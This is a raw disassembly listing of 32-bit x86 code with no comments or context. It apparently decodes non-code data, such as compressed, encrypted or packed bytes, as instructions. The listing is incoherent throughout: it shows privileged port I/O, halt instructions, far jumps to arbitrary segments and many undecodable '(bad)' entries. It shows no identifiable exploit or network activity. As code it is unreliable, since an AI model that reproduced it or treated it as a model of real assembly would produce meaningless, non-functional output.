  41cd16:	xchg   esi,edi
  41cd18:	test   BYTE PTR [esi+0x3e29c6fb],dl
  41cd1e:	pop    eax
  41cd1f:	adc    eax,eax
  41cd21:	jns    0x41cd25
  41cd23:	in     al,0xbb
  41cd25:	inc    ebp
  41cd26:	mov    ebp,0x1db9d375
  41cd2b:	repz jge 0x41ccf1
  41cd2e:	push   esp
  41cd2f:	loop   0x41ccf2
  41cd31:	adc    DWORD PTR [ecx-0x6183e08d],esp
  41cd37:	sub    edx,DWORD PTR ss:[ebx+edx*8+0x62c11c39]
  41cd3f:	ins    BYTE PTR es:[edi],dx
  41cd40:	jmp    0x3f16:0x2793b6c4
  41cd47:	lea    ebp,[edx+0x11372d7]
  41cd4d:	loopne 0x41cdb1
  41cd4f:	or     edx,DWORD PTR [esi-0x23d7281e]
  41cd55:	mov    bh,BYTE PTR [edx]
  41cd57:	inc    eax
  41cd58:	inc    esi
  41cd59:	adc    bl,ah
  41cd5b:	jge    0x41cd9a
  41cd5d:	out    dx,al
  41cd5e:	fucomip st,st(4)
  41cd60:	cmp    BYTE PTR [ebp+edx*8-0x5446cdd5],bl
  41cd67:	jmp    0x64d7:0xc11ae7c9
  41cd6e:	pop    edi
  41cd6f:	nop
  41cd70:	sahf   
  41cd71:	in     al,dx
  41cd72:	sti    
  41cd73:	add    al,0x1e
  41cd75:	shr    edx,1
  41cd77:	dec    esp
  41cd78:	mov    edx,DWORD PTR [eax+0x27]
  41cd7b:	dec    ebp
  41cd7c:	cdq    
  41cd7d:	sub    BYTE PTR [edi-0x15],dh
  41cd80:	mov    bl,0x8c
  41cd82:	ss pop esp
  41cd84:	pop    ecx
  41cd85:	jl     0x41cd27
  41cd87:	add    al,0x21
  41cd89:	add    edx,0xffffff9b
  41cd8c:	cmp    eax,0x5fc0d5b0
  41cd91:	or     DWORD PTR [esp+ecx*2-0x35883461],esi
  41cd98:	mov    esp,0xa7e0c776
  41cd9d:	push   edx
  41cd9e:	repnz arpl cx,dx
  41cda1:	sub    al,0xd5
  41cda3:	cld    
  41cda4:	loopne 0x41cd35
  41cda6:	int    0x9f
  41cda8:	ss hlt 
  41cdaa:	sbb    eax,DWORD PTR [edi]
  41cdac:	and    eax,0xa0ea9c09
  41cdb1:	(bad)  
  41cdb3:	pop    esi
  41cdb4:	dec    eax
  41cdb5:	and    eax,0x42f7e0e
  41cdba:	inc    ebx
  41cdbb:	push   0xffffffa7
  41cdbd:	inc    ebp
  41cdbe:	and    edx,DWORD PTR [esi]
  41cdc0:	out    0xfd,al
  41cdc2:	push   esp
  41cdc3:	shl    BYTE PTR ds:0x99eb53cf,1
  41cdc9:	pushf  
  41cdca:	loop   0x41ce41
  41cdcc:	cli    
  41cdcd:	jne    0x41ce0e
  41cdcf:	xor    al,dl
  41cdd1:	cld    
  41cdd2:	paddd  mm3,QWORD PTR [ecx+esi*8]
  41cdd6:	and    esi,DWORD PTR [esi+0x30]
  41cdd9:	sub    DWORD PTR [ebp+0x78],esp
  41cddc:	mov    ds:0xdab80576,al
  41cde1:	jne    0x41ce08
  41cde3:	adc    eax,0xd8e54252
  41cde8:	hlt    
  41cde9:	icebp  
  41cdea:	mov    al,0xaa
  41cdec:	in     eax,dx
  41cded:	and    DWORD PTR [edi-0x50a0ec30],0xe7f285fb
  41cdf7:	xor    ah,bl
  41cdf9:	jmp    0x126b34f8
  41cdfe:	shl    ah,cl
  41ce00:	cli    
  41ce01:	push   ss
  41ce02:	mov    ch,0xe2
  41ce04:	(bad)  
  41ce06:	les    edi,FWORD PTR [ebx+0xa]
  41ce09:	lahf   
  41ce0a:	sti    
  41ce0b:	mov    bl,0xaa
  41ce0d:	bound  edi,QWORD PTR [esi-0x33b61810]
  41ce13:	push   ebx
  41ce14:	mov    bl,0x78
  41ce16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce17:	ins    DWORD PTR es:[edi],dx
  41ce18:	int3   
  41ce19:	icebp  
  41ce1a:	jmp    0xbcf2e3f8
  41ce1f:	or     bh,BYTE PTR [esi-0x6f]
  41ce22:	pop    ss
  41ce23:	add    ebp,DWORD PTR [eax]
  41ce25:	sbb    ebx,DWORD PTR [edx+0x5f]
  41ce28:	xchg   ebp,eax
  41ce29:	push   ebp
  41ce2a:	or     ah,BYTE PTR [ecx+0x6]
  41ce2d:	sbb    al,0x8a
  41ce2f:	pop    esp
  41ce30:	cmp    esp,DWORD PTR [edx+0x6b58c83f]
  41ce36:	jbe    0x41ceb7
  41ce38:	mov    esp,eax
  41ce3a:	mov    bl,0x9d
  41ce3c:	sub    dh,BYTE PTR [bp+0x6]
  41ce40:	dec    ebx
  41ce41:	and    DWORD PTR [ecx+0x37],ebx
  41ce44:	xor    eax,0x22c5bb54
  41ce49:	push   0xf64eafc9
  41ce4e:	fwait
  41ce4f:	lds    eax,FWORD PTR [esi-0x19e235ce]
  41ce55:	test   BYTE PTR [eax+0x10],bh
  41ce58:	call   0xc830:0xa456525d
  41ce5f:	mov    al,ds:0xbba962cd
  41ce64:	dec    ebp
  41ce65:	pusha  
  41ce66:	(bad)  
  41ce67:	fcmovnu st,st(6)
  41ce69:	dec    eax
  41ce6a:	mov    al,0x87
  41ce6c:	test   al,0xce
  41ce6e:	mov    WORD PTR [ebx],gs
  41ce70:	sbb    BYTE PTR [eax+0x74f5556f],ch
  41ce76:	iret   
  41ce77:	jg     0x41ceb1
  41ce79:	cs mov esp,0xf8e3c6ce
  41ce7f:	aas    
  41ce80:	cdq    
  41ce81:	push   esi
  41ce82:	pop    edi
  41ce83:	push   ds
  41ce84:	ret    0x95ce
  41ce87:	xlat   BYTE PTR ds:[ebx]
  41ce88:	rol    esp,cl
  41ce8a:	sbb    ah,bl
  41ce8c:	pop    edx
  41ce8d:	jg     0x41ce3b
  41ce8f:	lds    eax,FWORD PTR [ecx+0x15c2ae59]
  41ce95:	push   edi
  41ce96:	arpl   WORD PTR [esi+0x5b81394c],bp
  41ce9c:	retf   0x2877
  41ce9f:	sbb    al,0x78
  41cea1:	(bad)  
  41cea2:	mov    ds:0xaa068b6e,eax
  41cea7:	adc    al,0x4e
  41cea9:	loopne 0x41ce80
  41ceab:	dec    eax
  41ceac:	pushf  
  41cead:	fwait
  41ceae:	mov    ds:0x4ad785a3,al
  41ceb3:	(bad)  
  41ceb4:	outs   dx,DWORD PTR ds:[esi]
  41ceb5:	mov    al,ds:0x327b18f5
  41ceba:	leave  
  41cebb:	xchg   esi,eax
  41cebc:	loope  0x41cf12
  41cebe:	inc    edi
  41cec0:	icebp  
  41cec1:	cdq    
  41cec2:	and    ebx,DWORD PTR [ebx]
  41cec4:	xor    DWORD PTR [esi+0x3b05b837],esi
  41ceca:	arpl   WORD PTR [ebp+0x257b906],di
  41ced0:	mov    al,0x87
  41ced2:	adc    esi,DWORD PTR [esi+eiz*4-0x1]
  41ced6:	int3   
  41ced7:	rol    DWORD PTR [esi+0xb5db295],0xe7
  41cede:	ret    
  41cedf:	pop    ss
  41cee0:	loopne 0x41cef9
  41cee2:	call   0xcde5:0x6e0d139a
  41cee9:	aas    
  41ceea:	sub    al,0xb2
  41ceec:	mov    edi,0xd88b3e08
  41cef1:	pop    esp
  41cef2:	pushf  
  41cef3:	sbb    esp,DWORD PTR [ebx+0x46]
  41cef6:	or     ah,ah
  41cef8:	and    ecx,DWORD PTR [edx+0x50]
  41cefb:	fstp   TBYTE PTR [edi-0x55]
  41cefe:	mov    ecx,0x748786a8
  41cf03:	retf   0xfd66
  41cf06:	call   0xda565360
  41cf0b:	mov    eax,ds:0x407b3f2a
  41cf10:	stos   BYTE PTR es:[edi],al
  41cf11:	jmp    0x1b3c:0x6d487c61
  41cf18:	xor    eax,0xbb95bdf4
  41cf1d:	ror    DWORD PTR [ebp+eiz*2+0x7a],1
  41cf21:	dec    esi
  41cf22:	mov    BYTE PTR [edx+0x26f6f16f],cl
  41cf28:	and    DWORD PTR [esi+esi*2],0x15
  41cf2c:	dec    ebp
  41cf2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf2e:	rcl    BYTE PTR [ecx-0x7a],0x6a
  41cf32:	jo     0x41ceec
  41cf34:	icebp  
  41cf35:	or     eax,0xae848c01
  41cf3a:	sub    DWORD PTR [esp+ebx*8],0xcefefe0e
  41cf41:	imul   ecx,edx,0x550c438d
  41cf47:	add    bp,WORD PTR [ecx]
  41cf4a:	jge    0x41ceda
  41cf4c:	mov    BYTE PTR [ebx],bh
  41cf4e:	xchg   DWORD PTR [edx+0x6a],eax
  41cf51:	inc    ebp
  41cf52:	mov    bl,bh
  41cf54:	xchg   esi,eax
  41cf55:	mov    WORD PTR [ebx-0x58],es
  41cf58:	mov    edx,0x593dcdb0
  41cf5d:	call   0xfb20ec23
  41cf62:	nop
  41cf63:	mov    ah,0xa8
  41cf65:	adc    dl,BYTE PTR [ecx+0x52b73c39]
  41cf6b:	cmp    al,0x70
  41cf6d:	lds    ebx,FWORD PTR [edx]
  41cf6f:	hlt    
  41cf70:	mov    ds:0x3f241bf5,al
  41cf75:	call   0xab7a6dea
  41cf7a:	cmp    BYTE PTR [eax+ebx*1-0x34546222],0xe1
  41cf82:	je     0x41cfdb
  41cf84:	xchg   eax,eax
  41cf86:	popa   
  41cf87:	fild   WORD PTR [eax+edx*8-0x58]
  41cf8b:	pop    es
  41cf8c:	popf   
  41cf8d:	ss mov bl,0x40
  41cf90:	push   esi
  41cf91:	pop    ss
  41cf92:	and    eax,0xdd61a928
  41cf97:	retf   
  41cf98:	sbb    eax,0x4fee0848
  41cf9d:	mov    ah,BYTE PTR [edx]
  41cf9f:	pop    ebp
  41cfa0:	scas   eax,DWORD PTR es:[edi]
  41cfa1:	dec    esp
  41cfa2:	cmp    ah,cl
  41cfa4:	jl     0x41d003
  41cfa6:	add    DWORD PTR [edi],ecx
  41cfa8:	push   ss
  41cfa9:	jl     0x41cfe7
  41cfab:	outs   dx,DWORD PTR ds:[esi]
  41cfac:	cmp    edi,DWORD PTR [ecx+edx*8]
  41cfaf:	daa    
  41cfb0:	ins    DWORD PTR es:[edi],dx
  41cfb1:	dec    ecx
  41cfb2:	jno    0x41cfa2
  41cfb4:	sub    al,0x73
  41cfb6:	push   edi
  41cfb7:	aad    0x56
  41cfb9:	inc    ecx
  41cfba:	and    DWORD PTR [esi],eax
  41cfbc:	int3   
  41cfbd:	pop    esp
  41cfbe:	fadd   st(0),st
  41cfc0:	lock mov ch,BYTE PTR [ebx+edx*4]
  41cfc4:	(bad)  
  41cfc5:	rol    DWORD PTR gs:[ebp-0x53772dcd],cl
  41cfcc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cfcd:	jle    0x41cfb1
  41cfcf:	or     edx,DWORD PTR [edi-0x444c5848]
  41cfd5:	pop    ebp
  41cfd6:	scas   al,BYTE PTR es:[edi]
  41cfd7:	and    eax,0x16ec803d
  41cfdc:	rcl    BYTE PTR [edx-0x10c92d9c],1
  41cfe2:	or     BYTE PTR [edi+eax*4+0x3243b787],cl
  41cfe9:	inc    esp
  41cfea:	shl    BYTE PTR [ecx+0x1090d95d],0xa8
  41cff1:	cmp    eax,0x93637be6
  41cff6:	sub    al,0xcb
  41cff8:	and    ecx,DWORD PTR [ebp+ebp*8+0x333300e1]
  41cfff:	sbb    DWORD PTR [ebp+edx*4-0x593b0943],0x21
  41d007:	clc    
  41d008:	cmp    DWORD PTR [ebx+0x70427bf],0x2f81d9f8
  41d012:	adc    BYTE PTR [esi-0x60bfd61b],0x1e
  41d019:	je     0x41cfd4
  41d01b:	push   eax
  41d01c:	pop    es
  41d01d:	mov    ds:0x11f457b8,al
  41d022:	inc    edx
  41d023:	cli    
  41d024:	lea    edx,[eax-0x1bc72934]
  41d02a:	xor    ebx,ebp
  41d02c:	loopne 0x41d009
  41d02e:	(bad)  
  41d02f:	lods   al,BYTE PTR ds:[esi]
  41d030:	push   esp
  41d031:	push   edx
  41d032:	and    al,0xbb
  41d034:	inc    edi
  41d035:	dec    edx
  41d036:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d037:	inc    BYTE PTR [ebx]
  41d039:	rcl    BYTE PTR [eax-0x593c7abf],0x6f
  41d040:	and    cl,BYTE PTR [ecx-0x45f14b4c]
  41d046:	inc    ebp
  41d047:	cmp    bl,ah
  41d049:	jbe    0x41d0c7
  41d04b:	ds sub eax,0xec0f8722
  41d051:	mov    dh,0xd7
  41d053:	hlt    
  41d054:	std    
  41d055:	cmp    cl,BYTE PTR [ebx+0x7769c670]
  41d05b:	inc    ecx
  41d05c:	repnz push eax
  41d05e:	inc    esp
  41d05f:	add    DWORD PTR [ecx],ebx
  41d061:	cmp    dh,BYTE PTR [eax-0x80]
  41d064:	addr16 or ecx,ecx
  41d067:	jmp    0x6aef:0x71985897
  41d06e:	push   esi
  41d06f:	faddp  st(3),st
  41d071:	hlt    
  41d072:	xor    BYTE PTR [esi-0x7b],0x5c
  41d076:	sbb    al,0x3e
  41d078:	jmp    0xece7:0x3c9821e8
  41d07f:	(bad)  
  41d080:	mov    bh,0x2c
  41d082:	(bad)  
  41d083:	sbb    eax,0x7e8f2e3a
  41d088:	fwait
  41d089:	arpl   di,dx
  41d08b:	pop    ecx
  41d08c:	loopne 0x41d0b4
  41d08e:	jns    0x41d051
  41d090:	add    al,0x31
  41d092:	or     eax,0x17280704
  41d097:	(bad)  
  41d099:	out    dx,eax
  41d09a:	fimul  DWORD PTR [ebx+0x183572dd]
  41d0a0:	inc    ebp
  41d0a1:	dec    ebp
  41d0a2:	sar    DWORD PTR [esi],1
  41d0a4:	mov    ch,BYTE PTR [esi-0x68]
  41d0a7:	mov    eax,0x83f87362
  41d0ac:	jge    0x41d04c
  41d0ae:	fstp   QWORD PTR [edx-0x6567bcca]
  41d0b4:	push   edx
  41d0b5:	push   cs
  41d0b6:	jae    0x41d089
  41d0b8:	(bad)  
  41d0b9:	outs   dx,BYTE PTR ds:[esi]
  41d0ba:	sbb    al,0x8
  41d0bc:	hlt    
  41d0bd:	jge    0x41d070
  41d0bf:	imul   edx,DWORD PTR [esp+eiz*8],0x26
  41d0c3:	sahf   
  41d0c4:	dec    esi
  41d0c5:	lock outs dx,DWORD PTR ds:[esi]
  41d0c7:	xchg   ecx,eax
  41d0c8:	mov    ebx,0x1d147441
  41d0cd:	aaa    
  41d0ce:	jae    0x41d0a9
  41d0d0:	nop
  41d0d1:	push   ebp
  41d0d2:	adc    al,0x2e
  41d0d4:	add    ebx,DWORD PTR [ecx+0x3e2055d1]
  41d0da:	clc    
  41d0db:	(bad)  
  41d0dc:	jecxz  0x41d060
  41d0de:	int3   
  41d0df:	popa   
  41d0e0:	jne    0x41d08c
  41d0e2:	pop    eax
  41d0e3:	xlat   BYTE PTR ds:[ebx]
  41d0e4:	scas   al,BYTE PTR es:[edi]
  41d0e5:	or     eax,0x34701b3b
  41d0ea:	jns    0x41d090
  41d0ec:	and    ah,BYTE PTR [ebx]
  41d0ee:	add    BYTE PTR [eax],cl
  41d0f0:	cwde   
  41d0f1:	xor    ebp,DWORD PTR [esi-0x31]
  41d0f4:	add    DWORD PTR [esi],edx
  41d0f6:	test   DWORD PTR [ecx-0x467aacdd],eax
  41d0fc:	cld    
  41d0fd:	or     eax,0x8104273c
  41d102:	jecxz  0x41d17c
  41d104:	adc    al,0xd6
  41d106:	pusha  
  41d107:	ins    DWORD PTR es:[edi],dx
  41d108:	pop    es
  41d109:	xor    ecx,DWORD PTR [edi+0x75]
  41d10c:	dec    esi
  41d10d:	push   ebx
  41d10e:	push   ds
  41d10f:	inc    eax
  41d110:	mov    ebp,0x22e363ce
  41d115:	mov    dh,0x24
  41d117:	adc    eax,0x725768f6
  41d11c:	aad    0xd8
  41d11e:	jg     0x41d182
  41d120:	or     eax,0x3ce5cd94
  41d125:	inc    edx
  41d126:	inc    esp
  41d127:	shl    BYTE PTR [edx],0x6e
  41d12a:	and    dh,ch
  41d12c:	test   al,0x2d
  41d12e:	sub    ah,bh
  41d130:	shr    DWORD PTR [ecx+0x7c47cf86],1
  41d136:	xor    cl,BYTE PTR [edx-0xa]
  41d139:	mov    dh,0x4e
  41d13b:	inc    edx
  41d13c:	(bad)  
  41d13d:	hlt    
  41d13e:	adc    BYTE PTR [edx],cl
  41d140:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d141:	mov    WORD PTR [ecx+edi*8-0x6a],fs
  41d145:	jae    0x41d18a
  41d147:	sahf   
  41d148:	ss (bad) 
  41d14a:	mov    ecx,0x9f6f3a4d
  41d14f:	call   0x17f56a35
  41d154:	rcr    DWORD PTR [edx+esi*2+0x47],0xaa
  41d159:	enter  0xfc41,0xfe
  41d15d:	push   0xffffff84
  41d15f:	sub    eax,0xc667a2fb
  41d164:	xor    cl,BYTE PTR [eax+0x44f3ee9a]
  41d16a:	push   0xfffffff8
  41d16c:	pop    edx
  41d16d:	cmp    BYTE PTR [edx-0x5fb978e6],0x20
  41d174:	and    al,0x63
  41d176:	lahf   
  41d177:	loope  0x41d177
  41d179:	ins    DWORD PTR es:[edi],dx
  41d17a:	jno    0x41d170
  41d17c:	pop    esp
  41d17d:	xor    BYTE PTR [ebp+edi*1+0x44],bl
  41d181:	scas   al,BYTE PTR es:[edi]
  41d182:	cdq    
  41d183:	and    al,0xf8
  41d185:	inc    eax
  41d186:	cdq    
  41d187:	push   es
  41d188:	cmc    
  41d189:	test   al,0x86
  41d18b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d18c:	test   eax,0x9419a27a
  41d191:	cmp    esi,DWORD PTR [ebx]
  41d193:	xor    esp,edx
  41d195:	ja     0x41d13c
  41d197:	cli    
  41d198:	ficomp WORD PTR [edi+0x386cce1f]
  41d19e:	lea    edi,[edx-0x2e]
  41d1a1:	mov    esi,0xfee4ac61
  41d1a6:	xchg   ebx,eax
  41d1a7:	into   
  41d1a8:	fldenv [ebp-0x2a]
  41d1ab:	pop    esp
  41d1ac:	js     0x41d1c1
  41d1ae:	adc    DWORD PTR [edi+esi*1-0x1a],0x67
  41d1b3:	xchg   BYTE PTR [ebp-0x6e],ch
  41d1b6:	and    DWORD PTR [ecx+0x7a315717],edx
  41d1bc:	pop    es
  41d1bd:	or     BYTE PTR [esi],ah
  41d1bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d1c0:	jb     0x41d1ee
  41d1c2:	jno    0x41d158
  41d1c4:	or     BYTE PTR [ecx+eax*8],dh
  41d1c7:	icebp  
  41d1c8:	loop   0x41d1f5
  41d1ca:	(bad)  
  41d1cb:	retf   0x78b5
  41d1ce:	(bad)  
  41d1cf:	in     al,dx
  41d1d0:	aad    0xe5
  41d1d2:	pop    ss
  41d1d3:	sbb    BYTE PTR [eax-0x48],0x7e
  41d1d7:	repnz and ch,BYTE PTR [edi-0xaa68fa5]
  41d1de:	mov    ss,WORD PTR [ebp*2+0x5d758ee8]
  41d1e5:	daa    
  41d1e6:	cmp    bh,BYTE PTR [ebx-0xc]
  41d1e9:	dec    edx
  41d1ea:	xchg   ecx,eax
  41d1eb:	sahf   
  41d1ec:	fst    st(6)
  41d1ee:	fisub  DWORD PTR [esi+0x70]
  41d1f1:	mov    bh,0x8e
  41d1f3:	jno    0x41d22a
  41d1f5:	jnp    0x41d20d
  41d1f7:	push   ecx
  41d1f8:	jg     0x41d239
  41d1fa:	mov    al,0xf
  41d1fc:	shr    ch,0x9e
  41d1ff:	lahf   
  41d200:	icebp  
  41d201:	pusha  
  41d202:	sahf   
  41d203:	test   al,0x61
  41d205:	push   ds
  41d206:	loopne 0x41d1bb
  41d208:	inc    esp
  41d209:	pushf  
  41d20a:	add    al,0x16
  41d20c:	dec    ebp
  41d20d:	mov    edi,0x85c8c2a9
  41d212:	popf   
  41d213:	sub    DWORD PTR [ecx+0x3a],ebp
  41d216:	jnp    0x41d1bd
  41d218:	mov    ah,0x4a
  41d21a:	in     eax,dx
  41d21b:	into   
  41d21c:	mov    BYTE PTR [ebx-0x10],dl
  41d21f:	out    dx,eax
  41d220:	test   al,bl
  41d222:	push   ss
  41d223:	inc    eax
  41d224:	mov    ebx,0x5820f02e
  41d229:	mov    ds:0x9a1fc643,eax
  41d22e:	(bad)  
  41d22f:	jge    0x41d1de
  41d231:	inc    esp
  41d232:	(bad)  
  41d233:	mov    eax,ds:0x845c4c78
  41d238:	aas    
  41d239:	(bad)  
  41d23a:	popa   
  41d23b:	aad    0xc3
  41d23d:	in     eax,dx
  41d23e:	cmp    al,0xd
  41d240:	push   ebx
  41d241:	xchg   DWORD PTR [ebx-0x1d],esi
  41d244:	cmp    DWORD PTR [edx+0x1a1e5218],edi
  41d24a:	call   0xfbc74747
  41d24f:	cmp    BYTE PTR [edx+0x38],ah
  41d252:	pushf  
  41d253:	mov    eax,0x82c9d574
  41d258:	and    al,BYTE PTR [ecx+0x63]
  41d25b:	sub    cl,BYTE PTR [ebp+0xd]
  41d25e:	mov    ebp,0xa75f61e6
  41d263:	mov    edx,0xf1b27849
  41d268:	add    esi,ebx
  41d26a:	dec    ecx
  41d26b:	or     cl,dl
  41d26d:	fisttp WORD PTR [edx-0x11]
  41d270:	jbe    0x41d287
  41d272:	dec    ecx
  41d273:	add    eax,DWORD PTR [ecx]
  41d275:	gs out dx,eax
  41d277:	lea    ecx,[edx+0x26]
  41d27a:	xor    BYTE PTR [edi+eax*2],dl
  41d27d:	push   edi
  41d27e:	and    dh,BYTE PTR [ecx-0x49c07c3d]
  41d284:	lods   al,BYTE PTR ds:[esi]
  41d285:	addr16 pusha 
  41d287:	mov    bl,0x1e
  41d289:	add    ah,BYTE PTR [edi]
  41d28b:	mov    bh,BYTE PTR [esp+eax*2+0x4b]
  41d28f:	shl    DWORD PTR [esi+0x1e5bba2e],1
  41d295:	hlt    
  41d296:	sub    al,0x3b
  41d298:	jmp    0x41d21b
  41d29a:	sbb    eax,0xdbc943ee
  41d29f:	(bad)  [ecx]
  41d2a1:	int    0x85
  41d2a3:	push   ebx
  41d2a4:	cmp    eax,0xe0cd73ae
  41d2a9:	aam    0xfa
  41d2ab:	nop
  41d2ac:	mov    WORD PTR [edi],ds
  41d2ae:	sar    BYTE PTR [ebp-0x2f],0x65
  41d2b2:	es mov ah,cl
  41d2b5:	fs pop ss
  41d2b7:	jmp    0x41d242
  41d2b9:	or     DWORD PTR [ecx],ebp
  41d2bb:	sub    dl,BYTE PTR [ebx]
  41d2bd:	cmp    al,0xa7
  41d2bf:	lds    edi,FWORD PTR [ecx+eax*8+0x1d]
  41d2c3:	pop    ebp
  41d2c4:	cs jnp 0x41d29e
  41d2c7:	sbb    eax,0x755599e
  41d2cc:	cmp    DWORD PTR [ebp+0x69],0x48b1a40f
  41d2d3:	jecxz  0x41d34f
  41d2d5:	ins    BYTE PTR es:[edi],dx
  41d2d6:	mov    ah,0x10
  41d2d8:	cmp    eax,0x535861f
  41d2dd:	xchg   esi,eax
  41d2de:	ds xchg edx,eax
  41d2e0:	jg     0x41d2c1
  41d2e2:	out    0x8,al
  41d2e4:	loope  0x41d27f
  41d2e6:	int3   
  41d2e7:	jne    0x41d299
  41d2e9:	mov    bh,BYTE PTR [edx+ecx*2]
  41d2ec:	rcr    ecx,cl
  41d2ee:	xchg   edx,eax
  41d2ef:	repz pop eax
  41d2f1:	pop    ss
  41d2f2:	enter  0xe111,0x15
  41d2f6:	push   eax
  41d2f7:	addr16 lock mov edx,0xb293dc36
  41d2fe:	nop
  41d2ff:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41d301:	loopne 0x41d381
  41d303:	mov    bh,0xbe
  41d305:	loopne 0x41d307
  41d307:	xchg   BYTE PTR [ebx-0x3a9b4bfe],cl
  41d30d:	imul   esi,DWORD PTR [edi],0x8de74d94
  41d313:	xchg   ecx,eax
  41d314:	out    dx,al
  41d315:	ret    0xd7eb
  41d318:	push   ecx
  41d319:	jmp    0xf8bef675
  41d31e:	outs   dx,DWORD PTR ds:[esi]
  41d31f:	mov    ecx,0x550b7d62
  41d324:	push   ecx
  41d325:	cmp    bh,BYTE PTR [edx+0x6a]
  41d328:	nop
  41d329:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d32a:	cmp    BYTE PTR [edi-0x43],0x6a
  41d32e:	fwait
  41d32f:	mov    dh,0x5e
  41d331:	or     eax,0xa02dcc36
  41d336:	test   DWORD PTR [edi+0x4c],esi
  41d339:	popa   
  41d33a:	pop    esp
  41d33b:	cmp    ecx,DWORD PTR [esi-0x1d756861]
  41d341:	std    
  41d342:	cmc    
  41d343:	sbb    edi,DWORD PTR [ecx-0x45831af]
  41d349:	fldenv [eax]
  41d34b:	push   ss
  41d34c:	sub    DWORD PTR [ebx+0x4ae8b9bd],edx
  41d352:	fsubr  QWORD PTR [edi-0x1801cee3]
  41d358:	inc    edi
  41d359:	cld    
  41d35a:	call   0x6c779c9d
  41d35f:	add    DWORD PTR [ebx],ebx
  41d361:	imul   BYTE PTR [esi+0x38]
  41d364:	fcom   DWORD PTR [eax-0x80]
  41d367:	jg     0x41d3b0
  41d369:	js     0x41d2eb
  41d36b:	cs xchg edi,eax
  41d36d:	inc    ebx
  41d36e:	(bad)  
  41d36f:	std    
  41d370:	mov    DWORD PTR [ebx],edx
  41d372:	inc    esp
  41d373:	sti    
  41d374:	push   ss
  41d375:	dec    ecx
  41d376:	jmp    0xf72ef618
  41d37b:	jge    0x41d304
  41d37d:	rcr    eax,0x23
  41d380:	out    dx,al
  41d381:	push   esi
  41d382:	rol    DWORD PTR [edi],cl
  41d384:	cmp    esi,DWORD PTR [ebp-0x1e]
  41d387:	js     0x41d3c0
  41d389:	hlt    
  41d38a:	sub    al,0x6a
  41d38c:	sub    eax,0x291f6f86
  41d391:	mov    esp,0x3e50886a
  41d396:	test   BYTE PTR [ebp-0x1104550e],0xed
  41d39d:	mov    eax,ds:0x9dd4
  41d3a2:	add    BYTE PTR [eax],al
  41d3a4:	add    BYTE PTR [eax],al
  41d3a6:	shr    ah,cl
  41d3a8:	and    edx,DWORD PTR [ecx]
  41d3aa:	aas    
  41d3ab:	fcomip st,st(2)
  41d3ad:	out    dx,eax
  41d3ae:	or     DWORD PTR [esi+0x222beacd],ebp
  41d3b4:	mov    ebx,0x1cce3ea
  41d3b9:	add    BYTE PTR [edx],ah
  41d3bb:	pop    es
  41d3bc:	add    BYTE PTR [eax],al
  41d3be:	add    BYTE PTR [ecx],bl
  41d3c0:	ror    DWORD PTR ds:0x18b1789,0x67
  41d3c7:	push   eax
  41d3c8:	(bad)  
  41d3c9:	xchg   ecx,eax
  41d3ca:	mov    dh,0xbc
  41d3cc:	jg     0x41d3e6
  41d3ce:	cmp    eax,0xaa95a231
  41d3d3:	test   BYTE PTR [eax-0x320beb78],0x24
  41d3da:	jp     0x41d407
  41d3dc:	jmp    0x5b03e7b4
  41d3e1:	ja     0x41d364
  41d3e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d3e4:	cmp    BYTE PTR ds:0xe8ce9094,0xca
  41d3eb:	lods   al,BYTE PTR ds:[esi]
  41d3ec:	xor    eax,0xf61e37cc
  41d3f1:	aas    
  41d3f2:	mov    edx,0x4bf9e3da
  41d3f7:	sub    dl,bl
  41d3f9:	stos   BYTE PTR es:[edi],al
  41d3fa:	jns    0x41d46c
  41d3fc:	imul   eax,DWORD PTR [eax+edx*2+0x4ac11f5],0xf3903e99
  41d407:	jae    0x41d456
  41d409:	in     eax,0x6b
  41d40b:	add    al,0x9d
  41d40d:	dec    edi
  41d40e:	xchg   edi,esi
  41d410:	sar    DWORD PTR [eax+ecx*2],1
  41d413:	jp     0x41d3c5
  41d415:	dec    ebx
  41d416:	cld    
  41d417:	cmp    eax,DWORD PTR [edi-0x59df7075]
  41d41d:	mov    ds:0xa7caa5f1,al
  41d422:	push   es
  41d423:	fisttp WORD PTR [eax+esi*2-0x25ee0785]
  41d42a:	ds retf 0x4f66
  41d42e:	mov    ch,BYTE PTR [esi]
  41d430:	out    0xc8,al
  41d432:	dec    ecx
  41d433:	mov    ch,BYTE PTR [ecx]
  41d435:	add    edx,DWORD PTR ds:0xfc09fd90
  41d43b:	jle    0x41d48e
  41d43d:	jl     0x41d42a
  41d43f:	mov    eax,0xf32d39e2
  41d444:	lahf   
  41d445:	jmp    0xf89a5adb
  41d44a:	xor    bh,bl
  41d44c:	enter  0xf01b,0x5d
  41d450:	(bad)  
  41d452:	stos   BYTE PTR es:[edi],al
  41d453:	fisubr DWORD PTR [esi]
  41d455:	pop    ebx
  41d456:	mov    cl,0x3a
  41d458:	dec    esi
  41d459:	mov    BYTE PTR [ebx],dh
  41d45b:	jmp    0x8cc9fb38
  41d460:	inc    ebx
  41d461:	lods   al,BYTE PTR ds:[esi]
  41d462:	leave  
  41d463:	sub    bh,BYTE PTR [ebp+0x74792220]
  41d469:	test   al,0x5b
  41d46b:	test   BYTE PTR [esi+ebx*2],dl
  41d46e:	or     cl,BYTE PTR [ebx]
  41d470:	sbb    DWORD PTR ds:[ecx],ecx
  41d473:	scas   eax,DWORD PTR es:[edi]
  41d474:	ds jne 0x41d3fc
  41d477:	mov    al,ds:0x73b336eb
  41d47c:	jle    0x41d499
  41d47e:	out    dx,al
  41d47f:	fcomp  DWORD PTR [ebp-0x6c]
  41d482:	out    dx,eax
  41d483:	fnsave [ebp+eiz*8+0x358ea4b3]
  41d48a:	inc    esp
  41d48b:	lahf   
  41d48c:	cmc    
  41d48d:	in     eax,dx
  41d48e:	pop    esi
  41d48f:	adc    eax,0xa25d06c2
  41d494:	imul   DWORD PTR [edi+0x315d486a]
  41d49a:	popf   
  41d49b:	mov    ch,cl
  41d49d:	or     dl,BYTE PTR [edi+ebp*8-0x2754bd53]
